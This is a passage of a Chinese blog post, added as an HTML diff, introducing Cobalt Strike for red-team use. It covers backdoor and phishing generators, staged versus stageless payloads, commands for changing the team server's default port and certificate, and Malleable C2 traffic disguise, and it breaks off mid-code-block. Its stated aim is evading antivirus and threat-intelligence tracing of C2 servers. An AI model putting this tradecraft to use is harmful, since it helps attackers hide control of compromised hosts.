@@ -1,0 +1,753 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="https://kcide.asia/PicGo/20250521164813069.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="XCDH">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="一. CS简介Cobalt Strike 是一款基于java语言开发的渗透测试神器，常被业界人称为CS神器。它被广泛用于模拟 高级持久性威胁（Advanced Persistent Threat，APT）和进行内网渗透。自3.0以后已经不在使用Metasploit框架而作为一个独立的平台使用，分为客户端与服务端 (C&#x2F;S架构的)，服务端是一个，客户端可以有多个，非常适合团队协同作战，多个">
+<meta property="og:type" content="article">
+<meta property="og:title" content="免杀之CS基础">
+<meta property="og:url" content="http://example.com/2025/06/06/%E5%85%8D%E6%9D%80%E4%B9%8BCS%E5%9F%BA%E7%A1%80/index.html">
+<meta property="og:site_name" content="XCDH">
+<meta property="og:description" content="一. CS简介Cobalt Strike 是一款基于java语言开发的渗透测试神器，常被业界人称为CS神器。它被广泛用于模拟 高级持久性威胁（Advanced Persistent Threat，APT）和进行内网渗透。自3.0以后已经不在使用Metasploit框架而作为一个独立的平台使用，分为客户端与服务端 (C&#x2F;S架构的)，服务端是一个，客户端可以有多个，非常适合团队协同作战，多个">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/Snipaste_2025-06-06_22-23-54.png">
+<meta property="og:image" content="http://example.com/img/Snipaste_2025-06-06_22-25-00.png">
+<meta property="og:image" content="http://example.com/img/Snipaste_2025-06-07_14-04-12.png">
+<meta property="og:image" content="http://example.com/img/Snipaste_2025-06-07_15-10-31.png">
+<meta property="og:image" content="http://example.com/img/Snipaste_2025-06-07_15-11-40.png">
+<meta property="og:image" content="http://example.com/img/Snipaste_2025-06-07_15-16-32.png">
+<meta property="og:image" content="http://example.com/img/Snipaste_2025-06-07_15-19-56.png">
+<meta property="og:image" content="http://example.com/img/Snipaste_2025-06-07_15-22-45.png">
+<meta property="og:image" content="http://example.com/img/Snipaste_2025-06-07_16-05-34.png">
+<meta property="og:image" content="http://example.com/img/Snipaste_2025-06-07_16-35-11.png">
+<meta property="article:published_time" content="2025-06-06T13:11:01.000Z">
+<meta property="article:modified_time" content="2025-06-07T08:36:03.897Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="免杀">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/img/Snipaste_2025-06-06_22-23-54.png">
+  
+  
+  
+  <title>免杀之CS基础 - XCDH</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 100vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>XCDH</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://kcide.asia/PicGo/20250521153237608.jpeg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="免杀之CS基础"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-06-06 21:11" pubdate>
+          2025年6月6日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          4.2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          35 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+        <div class="scroll-down-bar">
+          <i class="iconfont icon-arrowdown"></i>
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">免杀之CS基础</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="一-CS简介"><a href="#一-CS简介" class="headerlink" title="一. CS简介"></a>一. CS简介</h2><p>Cobalt Strike 是一款基于java语言开发的渗透测试神器，常被业界人称为CS神器。它被广泛用于模拟 高级持久性威胁（Advanced Persistent Threat，APT）和进行内网渗透。自3.0以后已经不在使用Metasploit框架而作为一个独立的平台使用，分为<strong>客户端与服务端</strong> (C&#x2F;S架构的)，服务端是一个，客户端可以有多个，非常适合团队协同作战，多个攻击者可以同时连接到一个团队服务器上，共享攻击资源与目标信息和sessions，可模拟APT做模拟对抗，进行内网渗透。</p>
+<p>Cobalt Strike集成了端口转发、服务扫描，自动化溢出，多模式端口监听，win exe木马生成，win dll木马生成，java木马生成，office宏病毒生成，木马捆绑；钓鱼攻击包括：站点克隆，目标信息获取，java执行，浏览器自动攻击等等</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">./teamserver 192.168.144.128 123456  peofile文件  //Jdk11以上都可以<br>./cobaltstrike<br><br>JDK11：（Ubuntu）<br><span class="hljs-built_in">sudo</span> apt update<br><span class="hljs-built_in">sudo</span> apt install openjdk-11-jre-headless<br>java -version<br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="1-1-Cobalt-Strike："><a href="#1-1-Cobalt-Strike：" class="headerlink" title="1.1  Cobalt Strike："></a>1.1  Cobalt Strike：</h3><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">New Connection 	<span class="hljs-comment"># 新建连接，支持连接多个服务器端</span><br><span class="hljs-keyword">Preferences </span>	<span class="hljs-comment"># 设置Cobal Strike界面、控制台、以及输出报告样式、TeamServer连接记录</span><br>Visualization 	<span class="hljs-comment"># 主要展示输出结果的视图</span><br>VPN Interfaces 	<span class="hljs-comment"># 设置VPN接口</span><br>Listenrs 	    <span class="hljs-comment"># 创建监听器</span><br><span class="hljs-keyword">Script </span>Manager 	<span class="hljs-comment"># 脚本管理，可以通过AggressorScripts脚本来加强自身，能够扩展菜单栏，</span><br><span class="hljs-keyword">Beacon命令行，提权脚本等</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="1-2-View-视图-："><a href="#1-2-View-视图-：" class="headerlink" title="1.2 View(视图)："></a>1.2 View(视图)：</h3><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs 1c">Applications 	<span class="hljs-meta"># 显示受害主机的应用信息</span><br>Credentials 	<span class="hljs-meta"># 显示所有以获取的受害主机的凭证，如hashdump、Mimikatz</span><br>Downloads 		<span class="hljs-meta"># 查看已下载文件</span><br>Event <span class="hljs-built_in">Log</span> 		<span class="hljs-meta"># 主机上线记录以及团队协作聊天记录</span><br>Keystrokes 		<span class="hljs-meta"># 查看键盘记录结果</span><br>Proxy Pivots 	<span class="hljs-meta"># 查看代理模块</span><br>Screenshots 	<span class="hljs-meta"># 查看所有屏幕截图</span><br>Script Console   <span class="hljs-meta"># 加载第三方脚本以增强功能 </span><br>Targets 		<span class="hljs-meta"># 显示所有受害主机</span><br>Web <span class="hljs-built_in">Log</span> 		<span class="hljs-meta"># 所有Web服务的日志</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="1-3-Attacks-攻击"><a href="#1-3-Attacks-攻击" class="headerlink" title="1.3 Attacks(攻击)"></a>1.3 Attacks(攻击)</h3><h4 id="1-3-1-生成后门"><a href="#1-3-1-生成后门" class="headerlink" title="1.3.1 生成后门"></a>1.3.1 生成后门</h4><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">HTML Application <span class="hljs-comment"># 生成(executable/VBA/powershell)这三种原理实现的恶意HTA木马文件</span><br><span class="hljs-keyword">MS</span> <span class="hljs-title">Office</span> Macro <span class="hljs-comment"># 生成office宏病毒文件</span><br>Payload Generator <span class="hljs-comment"># 生成各种语言版本的payload</span><br>Windows Executable <span class="hljs-comment"># 生成可执行exe木马</span><br>Windows Executable(Stageless) <span class="hljs-comment"># 生成无状态的可执行exe木马</span><br></code></pre></td></tr></table></figure>
+
+<p>1.3.2 Web Drive-by(钓鱼攻击)</p>
+<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">Manage 					<span class="hljs-comment"># 对开启的web服务进行管理</span><br><span class="hljs-keyword">Clone</span> <span class="hljs-title">Site</span> 			 	 <span class="hljs-comment"># 克隆网站，可以记录受害者提交的数据</span><br>Host File 			     <span class="hljs-comment"># 提供文件下载，可以选择Mime类型</span><br>Scripted Web Delivery     <span class="hljs-comment"># 为payload提供web服务以便下载和执行，类似于Metasploit的</span><br>web_delivery <br>Signed Applet Attack       <span class="hljs-comment"># 使用java自签名的程序进行钓鱼攻击(该方法已过时)</span><br>Smart Applet Attack         <span class="hljs-comment"># 自动检测java版本并进行攻击，针对Java 1.6.0_45以下以及Java 1.7.0_21以</span><br>下版本(该方法已过时)<br>System Profiler            <span class="hljs-comment"># 用来获取系统信息，如系统版本，Flash版本，浏览器版本等</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="二-木马上线："><a href="#二-木马上线：" class="headerlink" title="二. 木马上线："></a>二. 木马上线：</h2><h4 id="2-1-exe上线-（有阶段-Staged）"><a href="#2-1-exe上线-（有阶段-Staged）" class="headerlink" title="2.1 exe上线 （有阶段 Staged）"></a>2.1 exe上线 （有阶段 Staged）</h4><p><img src="/./img/Snipaste_2025-06-06_22-23-54.png" srcset="/img/loading.gif" lazyload></p>
+<h4 id="2-2-exe上线-无阶段-Stageless"><a href="#2-2-exe上线-无阶段-Stageless" class="headerlink" title="2.2 exe上线 (无阶段  Stageless)"></a>2.2 exe上线 (无阶段  Stageless)</h4><p><img src="/./img/Snipaste_2025-06-06_22-25-00.png" srcset="/img/loading.gif" lazyload></p>
+<h4 id="两者之间的区别："><a href="#两者之间的区别：" class="headerlink" title="两者之间的区别："></a>两者之间的区别：</h4><h5 id="Staged（有阶段-artifact-exe）"><a href="#Staged（有阶段-artifact-exe）" class="headerlink" title="Staged（有阶段 artifact.exe）:"></a><strong>Staged（有阶段 artifact.exe）:</strong></h5><p>​	<strong>定义：</strong> 在有阶段的执行方式中，Cobalt Strike Payload 分为两个主要阶段，即 <strong>Stager</strong> 和 <strong>Stage</strong>。</p>
+<p>​	<strong>Stager（初始执行载荷）：</strong> 执行的时候会去下载一个（大马）东西（本质：小马拉大马）</p>
+<p>​		<strong>定义：</strong> Stager是Stage 1，是一个较小的、轻量级的初始执行载荷。</p>
+<p>​		<strong>作用：</strong> 主要任务是与Cobalt Strike团队服务器建立初始连接，并从服务器下载更大的Payload，也就是Stage 2</p>
+<p>​	<strong>Stage （更大、完整的执行载荷）：</strong> （下载的大马不可控 是无法对其做免杀的）</p>
+<p>​		<strong>定义：</strong> Stage是Stage 2，是一个更大、更完整的执行载荷。</p>
+<p>​		<strong>作用：</strong> 一旦Stager与Cobalt Strike团队服务器建立连接，Stager会请求下载Stage。Stage是整个Payload的主体，包含了更多的功能和模块。一旦下载，Stage在目标系统上执行，并与Cobalt Strike服务器保持连接，执行渗透测试人员指定的各种命令和操作。</p>
+<h5 id="Stageless（无阶段-beacon-exe-）-（可以进行免杀）"><a href="#Stageless（无阶段-beacon-exe-）-（可以进行免杀）" class="headerlink" title="Stageless（无阶段  beacon.exe ）:  （可以进行免杀）"></a><strong>Stageless（无阶段  beacon.exe ）:</strong>  （可以进行免杀）</h5><p>​	<strong>定义：</strong> 在无阶段的执行方式中，整个 Payload 在一次性的过程中直接执行，而不需要分为两个阶段。（本质就是一个完整的大马）</p>
+<p>​	<strong>特点：</strong> 由于无阶段的执行方式减少了与团队服务器的交互，因此可能更难被检测。然而，这也限制了 Payload 的大小，因为整个 Payload 需要在一次连接中传输。<strong>Stageless 上线是没有web日志的</strong></p>
+<h2 id="三-CS的特征修改："><a href="#三-CS的特征修改：" class="headerlink" title="三. CS的特征修改："></a>三. CS的特征修改：</h2><p>特征 : 人或事物可供识别的特殊的象征或标志。</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ruby">服务器默认开放端口 <span class="hljs-number">50050</span><br>┌──(root㉿kali)-[~<span class="hljs-regexp">/桌面/cobaltstrike</span>_4.<span class="hljs-number">4</span>]<br>└─<span class="hljs-comment"># cat teamserver| tail -3</span><br><span class="hljs-comment"># start the team server.</span><br>java -<span class="hljs-variable constant_">XX</span><span class="hljs-symbol">:ParallelGCThreads=</span><span class="hljs-number">4</span> -<span class="hljs-title class_">Dcobaltstrike</span>.server_port=<span class="hljs-number">50050</span> -<span class="hljs-title class_">Djavax</span>.net.ssl.keyStore=./cobaltstrike.store -<span class="hljs-title class_">Djavax</span>.net.ssl.keyStorePassword=<span class="hljs-number">123456</span> -server -<span class="hljs-variable constant_">XX</span><span class="hljs-symbol">:+AggressiveHeap</span> -<span class="hljs-variable constant_">XX</span><span class="hljs-symbol">:+UseParallelGC</span> -<span class="hljs-title class_">Xms512</span>M -<span class="hljs-title class_">Xmx1024</span>M -classpath ./cobaltstrike.jar server.<span class="hljs-title class_">TeamServer</span> <span class="hljs-variable">$*</span><br></code></pre></td></tr></table></figure>
+
+<p>cobalt strike也有属于自己的特征 , 比如默认开放的端口号是50050(cs服务端的端口), 自带证书里面有cobalt strike字符等</p>
+<p>cs服务器如果默认特征不进行修改的话 , 很容易被搜索引擎或者威胁情报标记成木马远控服务器, 以及进行一些特征的修改就算ip地址暴露了, 也不能直接肯定这个ip是木马远控ip , 提高自身的隐藏性</p>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">protocol</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;cobaltstrike&quot;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="3-1-如何修改特征"><a href="#3-1-如何修改特征" class="headerlink" title="3.1 如何修改特征"></a>3.1 如何修改特征</h3><p>修改特征是针对 <strong>cs服务端</strong> 进行特征的修改, 客户端不需要修改</p>
+<p><strong>牢记 : cs服务器需要的时候再开启, 平常不需要的时候就关闭</strong></p>
+<h4 id="3-1-1-修改端口"><a href="#3-1-1-修改端口" class="headerlink" title="3.1.1 修改端口"></a>3.1.1 修改端口</h4><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">vim</span> <span class="hljs-string">teamserver</span><br>	<span class="hljs-string">只需要修改昀后一行的</span> <span class="hljs-string">-Dcobaltstrike.server_port</span> <span class="hljs-string">,</span> <span class="hljs-string">可以是</span> <span class="hljs-number">80</span> <span class="hljs-string">,</span> <span class="hljs-number">443</span> <span class="hljs-string">,</span> <span class="hljs-number">3389</span> <span class="hljs-string">,</span> <span class="hljs-number">8080</span><span class="hljs-string">,</span> <span class="hljs-number">8443</span><span class="hljs-string">等常见端口</span> <span class="hljs-string">,</span> <span class="hljs-string">前提是该端口没有被使用,</span> <span class="hljs-number">1</span><span class="hljs-number">-65535</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="3-1-2-修改默认证书"><a href="#3-1-2-修改默认证书" class="headerlink" title="3.1.2 修改默认证书"></a>3.1.2 修改默认证书</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">推荐付费ssl证书<br>1.购买域名,申请免费的ssl证书<br>2.修改teamserver证书密码<br>查看证书：<br>keytool -list -v -keystore cobaltstrike.store<br>Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=<span class="hljs-literal">true</span><br>默认口令： Microsoft   <br><br><br><span class="hljs-comment"># 原ssl证书文件备份</span><br><span class="hljs-built_in">mv</span> cobaltstrike.store cobaltstrike.store.bak<br><span class="hljs-comment"># 生成证书, 注意是一条命令</span><br>keytool -keystore cobaltstrike_new.store -storepass 1qazwsx -keypass 1qazwsx -genkey -keyalg RSA -<span class="hljs-built_in">alias</span> qq.com -dname <span class="hljs-string">&quot;CN=US, OU=qq.com,O=Software, L=Somewhere,ST=Cyberspace, C=CN&quot;</span><br><br>//cobaltstrike_new.store:新的文件名<br>//1qazwsx：新的证书密码（Microsoft类似这个）<br>//qq.com：用到的别名<br><br><span class="hljs-comment"># ssl证书重命名（teamserver在配置文件中写死了，必须是该文件名才行）</span><br><span class="hljs-built_in">mv</span> cobaltstrike_new.store cobaltstrike.store <br><span class="hljs-comment"># 进入teamserver文件中修改刚才生成的密码</span><br>vim teamserver<br><span class="hljs-comment"># start the team server.</span><br>java -XX:ParallelGCThreads=4 -Dcobaltstrike.server_port=8080 -Dcobaltstrike.server_bindto=0.0.0.0 -Djavax.net.ssl.keyStore=./cobaltstrike.store -Djavax.net.ssl.keyStorePassword=1qazwsx -server -XX:+AggressiveHeap -XX:+UseParallelGC -classpath ./cobaltstrike.jar -javaagent:CSAgent.jar=f38eb3d1a335b252b58bc2acde81b542 -Duser.language=en server.TeamServer $*<br></code></pre></td></tr></table></figure>
+
+<p><img src="/./img/Snipaste_2025-06-07_14-04-12.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">if</span> [ -e ./cobaltstrike.store ]; <span class="hljs-keyword">then</span><br>        print_info <span class="hljs-string">&quot;Will use existing X509 certificate and keystore (for SSL)&quot;</span><br><span class="hljs-keyword">else</span><br>        print_info <span class="hljs-string">&quot;Generating X509 certificate and keystore (for SSL)&quot;</span><br>        keytool -keystore ./cobaltstrike.store -storepass Microsoft -keypass Microsoft -genkey -keyalg RSA -<span class="hljs-built_in">alias</span> microsoft.com -dname <span class="hljs-string">&quot;CN=*.microsoft.com, OU=Microsoft Corporation, O=Microsoft Corporation, L=Redmond, S=WA, C=US&quot;</span><br><span class="hljs-keyword">fi</span><br></code></pre></td></tr></table></figure>
+
+<p>运行即可：</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs elixir">root<span class="hljs-variable">@HWY</span><span class="hljs-symbol">:~/coablt_strike_4</span>.<span class="hljs-number">5_</span>jx<span class="hljs-comment"># ./teamserver xxx.xx.xx.xx(本机地址) xxxxx（密码）</span><br>[*] <span class="hljs-title class_">Will</span> <span class="hljs-keyword">use</span> existing <span class="hljs-title class_">X509</span> certificate <span class="hljs-keyword">and</span> keystore (<span class="hljs-keyword">for</span> <span class="hljs-title class_">SSL</span>)<br>[+] <span class="hljs-title class_">Team</span> server is up on <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span><span class="hljs-symbol">:xxxx</span><br>[*] <span class="hljs-title class_">SHA256</span> hash of <span class="hljs-title class_">SSL</span> cert <span class="hljs-symbol">is:</span> <span class="hljs-number">9</span>d8ae956df258df5e3a45e6aedeaa8f310a201c6ff2e83fe9d06b719d5f814f8<br></code></pre></td></tr></table></figure>
+
+
+
+<h4 id="3-1-2-配置profile文件（伪装CS的流量）"><a href="#3-1-2-配置profile文件（伪装CS的流量）" class="headerlink" title="3.1.2 配置profile文件（伪装CS的流量）"></a>3.1.2 配置profile文件（伪装CS的流量）</h4><p>cs中默认是没有 profile文件 的, 需要自己配置, 而且官网称profile文件为 Malleablec2 , 整个<strong>profile文件</strong>的配置就是<strong>进行流量上的伪装</strong>,防溯源,免杀, 把命令的下发和结果的回传进行流量伪装 , 让他从流量上 看起来更像是在访问一个正常的网页</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs routeros">基本语法：<br><span class="hljs-comment"># this is a comment , # 是注释</span><br><span class="hljs-comment"># 设置全局变量 , 和其他无关是cs自身的一些机制</span><br><span class="hljs-built_in">set</span> global_option <span class="hljs-string">&quot;value&quot;</span>;<br><span class="hljs-comment"># 协议的配置 , 如: http-get , https-post等</span><br><span class="hljs-comment"># 代码块</span><br>protocol-transaction &#123;<br> <span class="hljs-built_in">set</span> local_option <span class="hljs-string">&quot;value&quot;</span>;<br><span class="hljs-built_in"> client </span>&#123;<br> # customize<span class="hljs-built_in"> client </span>indicators<br> &#125;<br><span class="hljs-built_in"> server </span>&#123;<br> # customize<span class="hljs-built_in"> server </span>indicators<br> &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span 